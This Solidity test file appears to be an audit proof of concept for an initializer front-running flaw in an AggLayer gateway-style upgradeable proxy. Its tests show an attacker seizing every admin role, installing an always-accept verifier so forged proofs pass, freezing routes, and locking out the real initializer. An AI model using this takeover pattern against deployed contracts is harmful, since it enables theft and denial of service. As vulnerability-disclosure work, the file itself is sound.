// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    ZkEvmContractsF1SimpleProxy,
    AggLayerGatewayLike,
    AlwaysAcceptVerifier,
    IAggLayerGatewayLike
} from "../src/ZkEvmContractsF1AggLayerGatewayInitHijackHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for AggLayerGateway first-caller initializer takeover.
contract ZkEvmContractsF1AggLayerGatewayInitHijackTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    bytes32 private constant AGGCHAIN_DEFAULT_VKEY_ROLE =
        keccak256("AGGCHAIN_DEFAULT_VKEY_ROLE");
    bytes32 private constant AL_ADD_PP_ROUTE_ROLE =
        keccak256("AL_ADD_PP_ROUTE_ROLE");
    bytes32 private constant AL_FREEZE_PP_ROUTE_ROLE =
        keccak256("AL_FREEZE_PP_ROUTE_ROLE");
    bytes32 private constant DEFAULT_ADMIN_ROLE = bytes32(0);

    function test_attacker_can_take_gateway_roles_via_first_initialize_call()
        public
    {
        address proxyAdmin = address(0xA11CE);
        address attacker = address(0xBEEF);

        AggLayerGatewayLike implementation = new AggLayerGatewayLike();
        ZkEvmContractsF1SimpleProxy proxy = new ZkEvmContractsF1SimpleProxy(
            proxyAdmin
        );
        IAggLayerGatewayLike gateway = IAggLayerGatewayLike(address(proxy));
        AlwaysAcceptVerifier maliciousVerifier = new AlwaysAcceptVerifier();

        vm.prank(proxyAdmin);
        proxy.upgradeTo(address(implementation));

        vm.prank(attacker);
        gateway.initialize(
            attacker,
            attacker,
            attacker,
            attacker,
            bytes4(0x11223344),
            address(maliciousVerifier),
            bytes32(uint256(1))
        );

        require(
            gateway.hasRole(DEFAULT_ADMIN_ROLE, attacker),
            "attacker should hold default admin role"
        );
        require(
            gateway.hasRole(AGGCHAIN_DEFAULT_VKEY_ROLE, attacker),
            "attacker should hold vkey role"
        );
        require(
            gateway.hasRole(AL_ADD_PP_ROUTE_ROLE, attacker),
            "attacker should hold add-route role"
        );
        require(
            gateway.hasRole(AL_FREEZE_PP_ROUTE_ROLE, attacker),
            "attacker should hold freeze-route role"
        );

        (address verifier, bytes32 vKey, bool frozen) = gateway.routeInfo(
            bytes4(0x11223344)
        );
        require(
            verifier == address(maliciousVerifier),
            "route verifier should be attacker-chosen"
        );
        require(vKey == bytes32(uint256(1)), "route vkey should be attacker-set");
        require(!frozen, "route should start unfrozen");
    }

    function test_attacker_controlled_route_can_accept_arbitrary_proof_bytes()
        public
    {
        address proxyAdmin = address(0xA11CE);
        address attacker = address(0xBEEF);
        bytes4 selector = bytes4(0x11223344);

        AggLayerGatewayLike implementation = new AggLayerGatewayLike();
        ZkEvmContractsF1SimpleProxy proxy = new ZkEvmContractsF1SimpleProxy(
            proxyAdmin
        );
        IAggLayerGatewayLike gateway = IAggLayerGatewayLike(address(proxy));
        AlwaysAcceptVerifier maliciousVerifier = new AlwaysAcceptVerifier();

        vm.prank(proxyAdmin);
        proxy.upgradeTo(address(implementation));

        vm.prank(attacker);
        gateway.initialize(
            attacker,
            attacker,
            attacker,
            attacker,
            selector,
            address(maliciousVerifier),
            bytes32(uint256(2))
        );

        // Accepts arbitrary bytes once attacker controls verifier route.
        gateway.verifyPessimisticProof(
            hex"aa55",
            abi.encodePacked(selector, hex"deadbeefcafebabe")
        );

        // Attacker can also freeze the route, causing verifier-path DoS.
        vm.prank(attacker);
        gateway.freezePessimisticVKeyRoute(selector);
        (bool ok, ) = address(proxy).call(
            abi.encodeWithSelector(
                IAggLayerGatewayLike.verifyPessimisticProof.selector,
                hex"aa55",
                abi.encodePacked(selector, hex"deadbeefcafebabe")
            )
        );
        require(!ok, "frozen attacker route should block verification");
    }

    function test_legitimate_initializer_is_locked_out_after_attacker_first_call()
        public
    {
        address proxyAdmin = address(0xA11CE);
        address attacker = address(0xBEEF);
        bytes4 attackerSelector = bytes4(0x11223344);
        bytes4 adminSelector = bytes4(0x55667788);

        AggLayerGatewayLike implementation = new AggLayerGatewayLike();
        ZkEvmContractsF1SimpleProxy proxy = new ZkEvmContractsF1SimpleProxy(
            proxyAdmin
        );
        IAggLayerGatewayLike gateway = IAggLayerGatewayLike(address(proxy));
        AlwaysAcceptVerifier maliciousVerifier = new AlwaysAcceptVerifier();
        AlwaysAcceptVerifier legitimateVerifier = new AlwaysAcceptVerifier();

        vm.prank(proxyAdmin);
        proxy.upgradeTo(address(implementation));

        vm.prank(attacker);
        gateway.initialize(
            attacker,
            attacker,
            attacker,
            attacker,
            attackerSelector,
            address(maliciousVerifier),
            bytes32(uint256(3))
        );

        vm.prank(proxyAdmin);
        (bool ok, ) = address(proxy).call(
            abi.encodeWithSelector(
                IAggLayerGatewayLike.initialize.selector,
                proxyAdmin,
                proxyAdmin,
                proxyAdmin,
                proxyAdmin,
                adminSelector,
                address(legitimateVerifier),
                bytes32(uint256(4))
            )
        );
        require(!ok, "legitimate initializer should be locked out");
        require(
            gateway.hasRole(DEFAULT_ADMIN_ROLE, attacker),
            "attacker-controlled role assignment should persist"
        );
    }
}

